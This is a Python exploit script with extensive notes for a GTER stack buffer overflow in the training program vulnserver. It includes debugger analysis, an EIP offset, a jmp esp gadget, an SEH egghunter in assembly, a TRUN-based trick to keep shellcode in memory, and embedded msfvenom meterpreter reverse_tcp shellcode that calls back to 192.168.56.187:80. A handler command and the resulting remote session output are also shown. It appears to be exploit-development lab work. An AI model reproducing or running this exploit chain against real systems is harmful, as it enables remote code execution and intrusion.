#!/usr/bin/env python3
import os, sys, re, socket, binascii, time
from struct import pack, unpack
from IPython import embed
## sudo python3 -m pip install keystone-engine capstone keystone colorama
from keystone import *
from capstone import *
from colorama import Fore, init
init() 

### ((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp ws2_32!recv; g'

## ((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp 00401902; g'

## Eh, break on the GTER::_Function1 ret and the TRUN::_Function3 ret
## ((cmd.exe /c "taskkill /F /IM vilnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp 00401902; bp 0x625012f0; g'

## Might also be useful at times:
## cmd.exe /c "taskkill /F /IM vulnserver.exe" && .\vulnserver.exe
## sxd av; sxd gp;  ## disable break on exception and disable break on Guard Page
## s -b 0x0 L?80000000 77 30 30 74 77 30 30 74
## s -a 0x0 L?80000000 "w00tw00t"

NOTES=r"""
┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ ./poc.py 192.168.56.100:9999
Welcome to Vulnerable Server! Enter HELP for help.

Valid Commands:
HELP
STATS [stat_value]      ; not_exploitable
RTIME [rtime_value]     ; not_exploitable
LTIME [ltime_value]     ; not_exploitable
SRUN [srun_value]       ; not_exploitable
TRUN [trun_value]       ; exploitable
GMON [gmon_value]       ; exploitable
GDOG [gdog_value]       ; not_exploitable
KSTET [kstet_value]     ; exploitable
GTER [gter_value]       ; exploitable
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT

With GTER opcode, the basic block starting at .text:004020C0 starts off with:
_malloc for 0xb4 bytes          ; [ebp+Source] !heap -x 0xd92988  "buf1"
_memset 0x0 for 0x400 bytes     ; [ebp+var_30] !heap -x 0xd94b68  "buf2"
_strncpy for 0xb4 bytes         ; [ebp+buf] !heap -x 0xd93b60 -> [ebp+Source] !heap -x 0xd92988
_memset 0x0 for 0x1000 bytes    ; [ebp+buf] !heap -x 0xd93b60

Ok, the strncpy copies 0xb4 bytes of the recvbuf into the _malloc'd "buf1" on the heap.  The _memset that follows that actually zeroes out the recvbuf.

Followed by this, a call to _Function1 is made.  Here's _Function1:
.text:004018E2 public _Function1
.text:004018E2 _Function1 proc near
.text:004018E2
.text:004018E2 Destination= byte ptr -94h
.text:004018E2 Source= dword ptr  8
.text:004018E2
.text:004018E2 ; __unwind {
.text:004018E2 push    ebp
.text:004018E3 mov     ebp, esp
.text:004018E5 sub     esp, 0A8h
.text:004018EB mov     eax, [ebp+Source]
.text:004018EE mov     [esp+4], eax    ; Source
.text:004018F2 lea     eax, [ebp+Destination]
.text:004018F8 mov     [esp], eax      ; Destination
.text:004018FB call    _strcpy
.text:00401900 nop
.text:00401901 leave
.text:00401902 retn

_Function1 takes as parameter just one argument, that's the source buffer.
[ebp+Source] was passed in, that's the destination buffer the recvbuf was _strncpy into for 0xb4 bytes.

The destination buffer is on the stack:
0:001> !address ebp-0x94
Usage:                  Stack
Base Address:           00a6f000
End Address:            00a70000
0:001> ? ebp-0x94
Evaluate expression: 10942828 = 00a6f96c

Destination buffer:
0:001> dd 00a6f96c
00a6f96c  00001000 00000000 000000c0 00000000
00a6f97c  0077fe68 00000114 00000000 00000000
00a6f98c  00000000 00000003 00a6f948 00000018
00a6f99c  00a6ffcc 72f3ae50 00000000 000000b4


Call stack before the call to _strcpy:
0:001> k
 # ChildEBP RetAddr      
WARNING: Stack unwind information not available. Following frames may be wrong.
00 00a6fa00 0040212a     vulnserver+0x18fb
01 00a6ff70 771600c9     vulnserver+0x212a
02 00a6ff80 77b87b4e     KERNEL32!BaseThreadInitThunk+0x19
03 00a6ffdc 77b87b1e     ntdll!__RtlUserThreadStart+0x2f
04 00a6ffec 00000000     ntdll!_RtlUserThreadStart+0x1b

Call stack after the call to _strcpy:
0:001> k
 # ChildEBP RetAddr      
WARNING: Stack unwind information not available. Following frames may be wrong.
00 00a6fa00 41414141     vulnserver+0x1900
01 00a6fa7c 77b66eac     0x41414141
02 00a6fb10 00a6faf8     ntdll!RtlpAllocateHeapInternal+0x104c
03 00000000 00000000     0xa6faf8

Returning from the function is going to place EIP at 0x41414141 (controlled EIP).

After executing ret:
0:001> 
eax=00a6f96c ebx=00000108 ecx=00d92a48 edx=000086dd esi=00401960 edi=00401960
eip=41414141 esp=00a6fa08 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
41414141 ??              ???

esp:
00a6fa08 41414141 41414141 41414141 41414141
00a6fa18 41414141 41414141 c7c6c5c4 0f7d9fa6

I'll place a breakpoint at the ret, and add a pattern string.
((cmd.exe /c "taskkill /F /IM vilnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp 00401902; g'

    oflow_sz = 0xb4
    opcode = "GTER "
    # slack1 = "\x41" * (oflow_sz - sum(iter([len(x) for x in [
    #     opcode
    # ]])))
    bad = sys.argv[2]
    
    buf = f"{opcode}{bad}"

./gter.py 192.168.56.100:9999 $(msf-pattern_create -l 0xb4)

At the ret:
Breakpoint 0 hit
eax=00adf96c ebx=00000110 ecx=00122a48 edx=0000ecb6 esi=00401960 edi=00401960
eip=00401902 esp=00adfa04 ebp=38654137 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
vulnserver+0x1902:
00401902 c3              ret
0:001> dds esp L0x1
00adfa04  41396541


┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ msf-pattern_offset -l 0xb4 -q 41396541
[*] Exact match at offset 147

So crash-time EIP should be a jmp esp
rp++-ng -f essfunc.dll --va 0x62500000 -usr8 -b "\x00" --regex ": jmp esp" -i
0x625012f0: jmp esp ;

With control of eip, it's time to think about what to do here, being there is only 0x14 bytes of space after EIP, and some 0x7c bytes before EIP, five of which are the opcode.  Previous work with kstet was in _Function1. At crash, EAX holds a pointer to the beginning of the new 0xb4 size buffer the recvbuf was _strncpy into.  We already know the buffer has only bad byte 0x0, because _strcpy doesn't work with a fixed size, it copies until it encounters a null byte.

Our "Stage1" payload should realign eax to the buffer after opcode "GTER ".  I think we might be able to use an egghunter here, because the begining of the current function that does the recv and handles these opcodes _malloc's the recvbuf, but nowhere within the function is free ever called.  We'll figure that part out later.

First, let's realign eax to point after "GTER ".

Registers after ret into crash EIP:
0:001> t
eax=00a5f96c ebx=0000010c ecx=00c32a48 edx=00006b41 esi=00401960 edi=00401960
eip=41414141 esp=00a5fa08 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
41414141 ??              ???

The following will realign and jump there:
    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "xor edx, edx; mov dl, 0x5; add eax, edx; jmp eax"

    #[.]  xor edx, edx\n mov dl, 0x5\n add eax, edx\n jmp eax
    # 00000000  31D2              xor edx,edx
    # 00000002  B205              mov dl,0x5
    # 00000004  01D0              add eax,edx
    # 00000006  FFE0              jmp eax
    # 8 bytes

    "\x31\xd2\xb2\x05\x01\xd0\xff\xe0"      # 31D2 xor edx,edx; B205 mov dl,0x5; 01D0 add eax,edx; FFE0 jmp eax # 8 bytes

We end up with a buffer like the following:
    oflow_sz = 0xb4
    EIP_offset = 147
    opcode = "GTER "
    EIP = packlatin("<L", 0x625012f0) ## 0x625012f0: jmp esp ;
    stage1 = (
        "\x31\xd2\xb2\x05\x01\xd0\xff\xe0"      # 31D2 xor edx,edx; B205 mov dl,0x5; 01D0 add eax,edx; FFE0 jmp eax # 8 bytes
    )
    slack1 = "\x41" * (EIP_offset - sum(iter([len(x) for x in [
        ""
    ]])))
    slack2 = "\x42" * (oflow_sz - sum(iter([len(x) for x in [
        opcode,
        slack1,
        EIP,
        stage1        
    ]])))
    buf = f"{opcode}{slack1}{EIP}{stage1}{slack2}"

Now we can focus on stage2, which is the egghunter.

I'll add the following imports:
from keystone import *
from capstone import *
from colorama import Fore, init
init() 

I'll add the EGGHUNTER_SEH, which is Windows10 compatible.
SEE: EGGHUNTER_SEH

I'll add the shellcode generation class I wrote, based on keystone, capstone, and colorama.
SEE: class KSASM

THe egghunter shellcode can be generated with:
egghunter = ksasm(EGGHUNTER_SEH, 32, True, badchars).get()

I end up with a buffer like:
    oflow_sz = 0xb4
    EIP_offset = 147
    opcode = "GTER "
    stage2 = (
        ksasm(EGGHUNTER_SEH, 32, True, badchars).get() ## egghunter_seh
    )
    EIP = packlatin("<L", 0x625012f0) ## 0x625012f0: jmp esp ;
    stage1 = (
        "\x31\xd2\xb2\x05\x01\xd0\xff\xe0"      # 31D2 xor edx,edx; B205 mov dl,0x5; 01D0 add eax,edx; FFE0 jmp eax # 8 bytes
    )
    slack1 = "\x41" * (EIP_offset - sum(iter([len(x) for x in [
        stage2
    ]])))
    slack2 = "\x42" * (oflow_sz - sum(iter([len(x) for x in [
        opcode,
        stage2
        slack1,
        EIP,
        stage1        
    ]])))
    buf = f"{opcode}{stage2}{slack1}{EIP}{stage1}{slack2}"

So all that is left is to figure out how to get the shellcode in memory unadulterated so egghunter can find it.

It looks like there are the following:
1. opcodes do a bunch of _malloc, _strcpy, then send(), no crash, loop back to recv()
2. opcodes do a bunch of _malloc, strcpy, then crash  (we don't want to do this)
3. EXIT opcode kills the socket, but doesn't exit vulnserver
4. non-existing opcodes... not sure, but it doesn't look good.

Basically the main challenge is that the primarily two paths involve either:
1. close the connection, loop back to recv
2. loop back to recv.

Both involve, the _malloc for the recv is already set, upstream of the loop.  So socket reuse is out of the question, because one recv is just going to overwrite another.

What is actually needed is to send either the shellcode or the egghunter, then send the other of the two, both on separate sockets.  This way they both get their own sockfd, and effectively their own _malloc.

So, we'll send the shellcode first,  But, like stated before, we need it to stay in memory for egghunter to encounter it and jump there.

So, the solution I came up with is, we'll send the shellcode on a different opcode (I chose TRUN because exploiting that one's dimensions are already known and it's the simplest/cleanest of the ones I've discovered so far).  If GTER memory by the time EIP control is obtained weren't only 0xb4 bytes in size, we could send a second GTER with the shellcode, but... not going to happen.  We don't care about actually executing any of the shellcode via EIP paths on the TRUN opcode, we just need to use it to gain control of EIP and put it into an endless loop so the shellcode stays memory-resident.  

We've already worked out a working solution for TRUN opcode, we're not trying to do that here, just use it to stay memory-persistent with the shellcode long enough for egghunter on GTER to find it.

In TRUN, When returning out of the crash-time EIP, which is a jmp esp instruction, ESP points to the dword directly following crash-time EIP.  In order to keep the shellcode memory-resident, we need to stay in the TRUN opcode handler.  So immediately after exiting out of _Function3 (executing the ret in _Function3).  That in effect executes the jmp esp.  The instructions that follow after the jmp esp are as follows:

"\x89\xe2\xff\xe2"      # 89E2 mov edx,esp; FFE2 jmp edx # 4 bytes

This mov edx, esp followed immediately by a jmp edx causes a loop where jmp edx goes back to the mov edx, esp instruction.  In this way, CPU usage remains high due to the busy work.  But, it gives egghunter a chance to to find the eggegg and jmp there, execute the shellcode.

As a matter of timing and technique, the following seems to be important:
    sock_persist = sender(ip,port,buf_persistence)
    time.sleep(3)  ## sleep long enough for vulnserver to open another accept()  (new sockfd)
    sock = sender(ip, port,buf_egghunter)
    print(sock.recv(1024))
    
    input()
    sock_persist.close()

The persistence payload on opcode TRUN is sent first, then sleep for three seconds.  This gives enough time to vulnserver.exe (as busy as it is now thanks to persistence payload) to open another accept() which creates a new sockfd (and new _malloc assocated to the sockfd).  The egghunter payload on opcode GTER is then sent.  Seems like a recv is needed here in order to not take a failure branch before egghunter enters runtime.  The input() is important because we want to block and not kill of either sockfd, or exit the PoC, as long as we want our meterpreter to remain running.  I suppose we could just prepend_migrate and then who cares what happens to vulnserver after we've migrated out of it.

Anyways, boy does it sure shell good!

┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ sudo msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.187; set LPORT 80; set EXITFUNC process; run"
[sudo] password for notroot: 
[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
LHOST => 192.168.56.187
LPORT => 80
EXITFUNC => process
[*] Started reverse TCP handler on 192.168.56.187:80 
[*] Sending stage (175686 bytes) to 192.168.56.100
[*] Meterpreter session 1 opened (192.168.56.187:80 -> 192.168.56.100:50257) at 2023-05-24 22:12:11 -0700

meterpreter > getuid
Server username: DESKTOP-4NR4332\Admin
meterpreter > sysinfo
Computer        : DESKTOP-4NR4332
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

The downside is that, even with an EXITFUNC=process shellcode, volnserver.exe takes quite a while to fully exit (somewhere around 1min) and this is due to the endless loop to keep the shellcode memory-resident.  And of course, EXITFUNC=thread would only kill off the same thread the egghunter was running in and handed off execution to the shellcode (the gter opcode), not the thread running the persistence/endless loop (the trun opcode).

I suppose just about any of the exploitable opcodes could be used for persistence in this same way, given the opcode satisfies two requirements:
1. You can get control of EIP (duh)
2. The opcode storage containing the pristine shellcode still exists and is large enough to hold all the shellcode (obv. the one having only 0xb4 size isn't going to work, for example, and the recvbuf is already overwritten by the time you have EIP control)


### UPDATE:
I did go back and add prependmigrate, and that solves for vulnserver exiting when the sockfds are closed or the PoC exits.
However, vulnserver now hangs, and never exits, even when the meterpreter and PoC have exited.  (Endless loop still endless looping).

In the meterpreter shell, pkill vulnserver.exe fixes things.  Just kind of annoying how we had to get here via GTER.
"""

EGGHUNTER_SEH = """
start:
	jmp get_seh_address	; negative call to get egghunter position dynamically
build_exception_record:
	pop ecx				; pop exception_handler address into ecx
	mov eax, 0x74303077	; egg w00t into eax
	push ecx			; push _EXCEPTION_REGISTRATION_RECORD structure
						;, ptr back onto stack
	push 0xffffffff		; _EXCEPTION_REGISTRATION_RECORD Next
	xor ebx, ebx		; null ebx
	; 0:004> !teb
	;,TEB at 00388000
    ;,		ExceptionList:        03d2ea2c
    ;,		StackBase:            03d30000
    ;,		StackLimit:           03d2c000
	mov dword ptr fs:[ebx], esp	; overwrite TEB::ExceptionList
						;, with our _EXCEPTION_REGISTRATION_RECORD ptr
	sub ecx, 0x04		; sub 0x04 from the pointer to exception_handler
	add ebx, 0x04		; add 0x04 to ebx
	mov dword ptr fs:[ebx], ecx ; overwrite TEB::StackBase, making it appear
						;, to be four bytes lower addressed than the _E_R_R
						;, structure.  Clever.
is_egg:
	push 0x02			; number of times to repe scasd
	pop ecx				; counter for repe scasd
	mov edi, ebx		; page memory addr to edi
	repe scasd			; check for egg at page addr and if page invalid
						;, access then raise exception to our
						;, exception_handler function,
						;, repe to repeat scasd a second time, so eggegg
	jnz loop_inc_one	; if not egg found at page, inc ebx and repeat
	jmp edi				; eggegg found, then jmp to it
loop_inc_page:
	or bx, 0xfff		;, if invalid page, our exception handler points eip
						;, here
loop_inc_one:
	inc ebx				; if invalid page, increment by 0x1000 effective.
	jmp is_egg			; check for egg again
get_seh_address:
	call build_exception_record	; call to a higher address to avoid null
						;, bytes, which the call indirectly pushes egghunter
						;, position onto the stack
	push 0x0c			; push 0x0c onto stack
						;, 0x0c is an offset to our CONTEXT structure
	pop ecx
	mov eax, [esp+ecx]	; pointer to our CONTEXT structure into eax
	mov cl, 0xb8		; offset to EIP
	add dword ptr ds:[eax+ecx], 0x06	; inc EIP by 0x06 in our CONTEXT
						;, structure, so it points to the or bx, 0xfff
						;, instruction to increase the memory page
	pop eax				; save return value into eax
	add esp, 0x10		; inc esp to clean the stack for our call
	push eax			; push return value onto stack
	xor eax, eax		; null eax to simulate return as
						;, ExceptionContinueExecution
	ret					; return
""" ## 69 

class ksasm:
	def __init__(s, asm, bitness, debug=False, badchars=None, encoder=None, iterations=None):
		## x86/fnstenv_mov (22)
		## x86/call4_dword_xor (24)
		## x86/jmp_call_additive (29)
		s.KBITS = {32 : KS_MODE_32, 64 : KS_MODE_64}
		s.CBITS = {32: CS_MODE_32, 64 : CS_MODE_64}
		s.ARCHS = {32 :"x86", 64 : "x64"}
		s.asm = asm
		s.bitness = bitness
		s.debug = debug
		s.comment_stripped_asm = "\n".join([re.sub("\t?;.+$", "", x) for x in s.asm.split("\n")])
		s.badchars = badchars
		s.bcs = ''.join([f"\\x{ord(x):02x}" for x in s.badchars]) if not s.badchars == None else None
		s.bcs2 = [f"{ord(x):02x}" for x in badchars] if not s.badchars == None else None
		s.encoder = encoder
		s.iterations = iterations
		s.encoding, s.count = (Ks(KS_ARCH_X86, s.KBITS[s.bitness])).asm(s.comment_stripped_asm)
		s.encoding2 = []  ## populated when msfvenom encrypt
		s.__runtime()

	## public
	def get(s):
		""" Returns generated shellcode decoded latin-1 """
		if len(s.encoding2) < len(s.encoding):
			return bytearray(s.encoding).decode('latin-1')
		else:
			## else encryption seems to have worked
			return bytearray(s.encoding2).decode('latin-1')

	## private
	def __runtime(s):
		s.disassembled = s.__get_disasm(s.encoding) if not debug == True else ""
		s.hexes = s.__get_c_hexlist(s.encoding)
		s.pyhexstrs = s.__gen_pyhexarray(s.hexes)
		s.c_hexstr = ''.join(s.hexes)
		s.__printer(s.disassembled, s.pyhexstrs, s.c_hexstr, s.encoding) if s.debug == True else None
		if not None in [s.badchars, s.encoder, s.iterations]:
			s.__msfvenom()
			s.e_disassembled = s.__get_disasm(s.encoding2) if not debug == True else ""
			s.e_hexes = s.__get_c_hexlist(s.encoding2)
			s.e_pyhexstrs = s.__gen_pyhexarray(s.e_hexes)
			s.e_c_hexstr = ''.join(s.e_hexes)
			s.__printer(s.e_disassembled, s.e_pyhexstrs, s.e_c_hexstr, s.encoding2) if s.debug == True else None

	def __msfvenom(s):
		cmd = f"/bin/bash -c 'echo -ne \"{s.c_hexstr}\" | msfvenom -a {s.ARCHS[s.bitness]} --platform windows -b \"{s.bcs}\" -e \"{s.encoder}\" -i {s.iterations} -f raw'"
		CMD = shlex.split(cmd)
		print(CMD)
		result = subprocess.check_output(CMD)
		s.encoding2 = [ord(chr(x)) for x in result]

	def __highlight(s,inp):
		tmp = inp
		if not s.bcs2 == None:
			if len(s.bcs2) > 0:
				for item in s.bcs2:
					if item in tmp:
						tmp = tmp.replace(item, f"{Fore.LIGHTRED_EX}{item}{Fore.RESET}")
		return tmp

	def __get_c_hexlist(s,inp):
		return [f"\\x{int(I):02x}" for I in inp]

	def __gen_pyhexarray(s,inp):
		return "\n".join([f"\"{''.join(inp[x:x+16])}\"" for x in range(0, len(inp), 16)])

	def __get_disasm(s,inp):
		return "\n".join([ f"{format(obj.address,'02x'):>4}:   {' '.join([f'{x:02x}' for x in obj.bytes]):<24}{obj.mnemonic:<8}{obj.op_str}" for obj in Cs(CS_ARCH_X86, s.CBITS[s.bitness]).disasm(bytearray(inp), 0x0)])

	def __printer(s,dissed,pyhex,c_hex,inp):
		print(f"\n{s.__highlight(dissed)}\n\nbuf = (\n{s.__highlight(pyhex)}\n) # {len(inp)}\n\n{s.__highlight(c_hex)}")


def packlatin(fmt, inp):
        return pack(fmt, inp).decode('latin-1')

# def unpacklatin(fmt, inp):
#         return unpack(fmt, inp.encode('latin-1'))[0]

# def uniesc_to_bytestr(instring):
#     r""" '\\x58\\x59\\x5a\\xa0' -> 'XYZ\xa0' 
#         hexstrings in from cli, ex., argparse   """
#     return bytes(instring, 'utf-8').decode("unicode_escape")

# def bytestr_to_long(inbstr):
#     r""" 'XYZ\xa0' -> 2690275672 """
#     return unpack("I",bytes(inbstr,'latin-1'))[0]

# def long_to_bytestr(inlong):
#     r""" 2690275672 -> 'XYZ\xa0' """
#     return pack("<L", inlong).decode('latin-1')

# def octalstring_to_bytestr_pad(inoct):
#     r""" "0x200" -> '\x00\x02\x00\x00' (le) 
#         for the --va + --addbase scenario 
#         pad with \x00 to dword size bytes """
#     return pack("<L", (int(inoct,16))).decode('latin-1')

# def octalstring_to_bytestr_nopad(inoct):
#     r""" "0x200" -> '\x00\x02' (le) 
#         for the --va only scenario 
#         no padding with \x00 to dword size bytes """
#     octstr = inoct[2:]
#     if len(octstr) % 2 == 1:
#         octstr = f"0{octstr}"
#     return ''.join([chr(int(octstr[x:x+2],16)) for x in range(0,len(octstr),2)][::-1])


badchars = "\x00"
def gen_badchars(bc, start="\x01", end="\xff"):
	s_int = ord(start)
	e_int = ord(end)+1
	BC = bytearray(range(s_int,e_int)).decode('latin-1')
	for item in bc:
		BC = BC.replace(item,'')
	return BC

def sender(ip, port, buf):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.send(buf.encode('latin-1'))
    return sock

def sender_sockreuse(sock,buf):
    sock.send(buf.encode('latin-1'))
    return sock

def help(ip,port):
    buf = "HELP" 
    sock = sender(ip, port, buf)
    # print(sock.recv(4096))
    print(sock.recv(4096).decode('latin-1'))
    print(sock.recv(4096).decode('latin-1'))
    sock.close()

def main():
    if len(sys.argv) < 2:
        print(f"USAGE: {sys.argv[0]} ip:port")
        sys.exit()
    else:
        ip, port = sys.argv[1].split(":")
        port = int(port)
    # help(ip,port)



    oflow_sz = 0xb4
    EIP_offset = 147
    opcode = "GTER "
    stage2 = (
        "\x90\x90\x90\x90\x90"
        "\x66\x81\xec\x14\x05\x89\xe5"  # 6681EC1405 sub sp,0x514; 89E5 mov ebp,esp # 7 bytes
    )
    egghunter = ksasm(EGGHUNTER_SEH, 32, True, badchars).get() ## egghunter_seh
    EIP = packlatin("<L", 0x625012f0) ## 0x625012f0: jmp esp ;
    stage1 = (
        ## Seems like the egghunter code needs to reside at an address higher than ESP
        ## Or, at least not so close to it that stackops could munge it.
        ## Also, may or may not need EBP to point at something RW-able. Better safe/sorry
        "\x31\xd2\xb2\x05\x01\xd0\xff\xe0"      # 31D2 xor edx,edx; B205 mov dl,0x5; 01D0 add eax,edx; FFE0 jmp eax # 8 bytes
    )
    slack1 = "\x41" * (EIP_offset - sum(iter([len(x) for x in [
        stage2,
        egghunter
    ]])))
    slack2 = "\x42" * (oflow_sz - sum(iter([len(x) for x in [
        opcode,
        stage2,
        egghunter,
        slack1,
        EIP,
        stage1        
    ]])))
    buf_egghunter = f"{opcode}{stage2}{egghunter}{slack1}{EIP}{stage1}{slack2}"


    ### memory-persistence payload (endless loop in stage1 keeps opcode handler from doing anything destructive with the memory, like exiting the handler, closing the socket, freeing the _malloc, or looping back to recv() just to overwrite the _malloc again)
    ### Yes, we could totally just go straight to shellcode execution with TRUN opcode.
    ##, but the point of this exercise is to exploit GTER opcode, dummy
    oflow_sz = 0x1000
    crash_offset = 2006
    opcode = "TRUN \x2e"
    spacer = "\x20" * 2
    eggegg = "w00tw00t"
    nopsled = "\x90" * 0x24
    shellcode = (
        ## msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.187 LPORT=80 EXITFUNC=thread prependmigrateprocess=WerFault.exe prependmigrate=true -b "\x00" -e x86/xor_dynamic -f c
        ## sudo msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.187; set LPORT 80; run"
        "\xeb\x23\x5b\x89\xdf\xb0\xe2\xfc\xae\x75\xfd\x89\xf9\x89"
        "\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\x8f\x57\x74\x08\x46"
        "\x80\x3e\xe2\x75\xee\xeb\xea\xff\xe1\xe8\xd8\xff\xff\xff"
        "\x09\xe2\xf5\xe1\x8b\x09\x09\x09\x69\x80\xec\x38\xc9\x6d"
        "\x82\x59\x39\x82\x5b\x05\x82\x5b\x1d\x82\x7b\x21\x06\xbe"
        "\x43\x2f\x38\xf6\xa5\x35\x68\x75\x0b\x25\x29\xc8\xc6\x04"
        "\x08\xce\xeb\xfb\x5b\x5e\x82\x5b\x19\x82\x43\x35\x82\x45"
        "\x18\x71\xea\x41\x08\xd8\x58\x82\x50\x29\x08\xda\x82\x40"
        "\x11\xea\x33\x40\x82\x3d\x82\x08\xdf\x38\xf6\xa5\xc8\xc6"
        "\x04\x08\xce\x31\xe9\x7c\xff\x0a\x74\xf1\x32\x74\x2d\x7c"
        "\xed\x51\x82\x51\x2d\x08\xda\x6f\x82\x05\x42\x82\x51\x15"
        "\x08\xda\x82\x0d\x82\x08\xd9\x80\x4d\x2d\x2d\x52\x52\x68"
        "\x50\x53\x58\xf6\xe9\x56\x56\x53\x82\x1b\xe2\x84\x54\x88"
        "\xcd\x79\xf7\xf6\xf6\x84\x5d\x2d\x69\x5b\x61\xb8\x43\x62"
        "\xb8\xf6\xdc\x84\x4d\x2d\x69\xe2\x55\x57\x84\x71\x69\x5e"
        "\x59\x38\xd2\x5a\x5a\x61\x0d\x09\x09\x01\x5a\x5a\x5a\x5f"
        "\x5a\x61\x70\xc5\x36\x8f\xf6\xdc\x8c\xc9\x7d\x59\x63\x49"
        "\x89\xce\x19\x5a\x5a\x38\xd2\x5a\xf6\x3e\x61\xa7\x8e\x9b"
        "\x36\xf6\xdc\x5d\x61\x7e\x08\x09\x09\xe2\x39\x59\xf6\x3e"
        "\x61\xcc\xd1\xb4\xee\xf6\xdc\x5a\x5a\x5a\x82\x45\x2d\xf5"
        "\x58\x5a\x5a\xf6\x3e\x61\xcf\xa5\x93\x70\xf6\xdc\xe0\x62"
        "\x08\x09\x09\xe1\x96\xf6\xf6\xf6\x7b\x7c\x67\x6d\x65\x65"
        "\x3a\x3b\x09\xe1\xc2\xf6\xf6\xf6\xf5\xe1\x86\x09\x09\x09"
        "\x69\x38\xdb\x6d\x82\x5b\x39\x80\xec\x82\x5b\x05\x82\x5b"
        "\x1d\x38\xf6\x82\x7b\x21\x06\xbe\x43\x2f\x38\xc9\xa5\x35"
        "\x68\x75\x0b\x25\x29\xc8\xc6\x04\x08\xce\x40\x7c\xe6\x5b"
        "\x5e\x82\x5b\x19\x82\x4b\x35\x08\xd9\x82\x49\x71\x8c\xc9"
        "\x7d\x45\x08\xd9\x82\x51\x29\x82\x41\x11\x59\x08\xda\x8c"
        "\xc0\x7d\x35\x40\x82\x3d\x82\x08\xdf\x38\xf6\x38\xc9\xc8"
        "\xc6\x04\xa5\x08\xce\x31\xe9\x7c\xfd\x0a\x74\xf1\x32\x74"
        "\x2d\x7c\xe9\x51\x82\x51\x2d\x08\xda\x6f\x82\x05\x42\x82"
        "\x51\x15\x08\xda\x82\x0d\x82\x08\xd9\x80\x4d\x2d\x2d\x52"
        "\x52\x68\x50\x53\x58\xf6\xe9\x51\x56\x53\x82\x1b\xe0\x89"
        "\xf6\xf6\xf6\x54\x61\x3a\x3b\x09\x09\x61\x7e\x7a\x3b\x56"
        "\x5d\x61\x45\x7e\x2f\x0e\x80\xe1\xf6\xd9\xb1\x99\x08\x09"
        "\x09\x20\xcd\x5d\x59\x61\x20\x89\x62\x09\xf6\xdc\x63\x03"
        "\x61\xc9\xa1\x31\xb2\x61\x0b\x09\x09\x59\x80\xef\x59\x59"
        "\x59\x59\x49\x59\x49\x59\x61\xe3\x06\xd6\xe9\xf6\xdc\x9e"
        "\x63\x19\x5f\x5e\x61\x90\xac\x7d\x68\xf6\xdc\x8c\xc9\x7d"
        "\x03\xf6\x47\x01\x7c\xe5\xe1\x6e\x09\x09\x09\x63\x09\x63"
        "\x0d\x5f\x5e\x61\x0b\xd0\xc1\x56\xf6\xdc\x8a\xf1\x09\x77"
        "\x3f\x82\x3f\x63\x49\x61\x09\x19\x09\x09\x5f\x63\x09\x61"
        "\x51\xad\x5a\xec\xf6\xdc\x9a\x5a\x63\x09\x5f\x5a\x5e\x61"
        "\x0b\xd0\xc1\x56\xf6\xdc\x8a\xf1\x09\x74\x21\x51\x61\x09"
        "\x49\x09\x09\x63\x09\x59\x61\x02\x26\x06\x39\xf6\xdc\x5e"
        "\x61\x7c\x67\x44\x68\xf6\xdc\x57\x57\xf6\x05\x2d\x06\x8c"
        "\x79\xf6\xf6\xf6\xe0\x92\xf6\xf6\xf6\x08\xca\x20\xcf\x7c"
        "\xc8\xca\xb2\xe9\x14\x23\x03\x61\xaf\x9c\xb4\x94\xf6\xdc"
        "\x35\x0f\x75\x03\x89\xf2\xe9\x7c\x0c\xb2\x4e\x1a\x7b\x66"
        "\x63\x09\x5a\xf6\xdc\x8f\x57" # 693
    )
    slack1 = "\x41" * (crash_offset - sum(iter([len(x) for x in [
        spacer,
        eggegg,
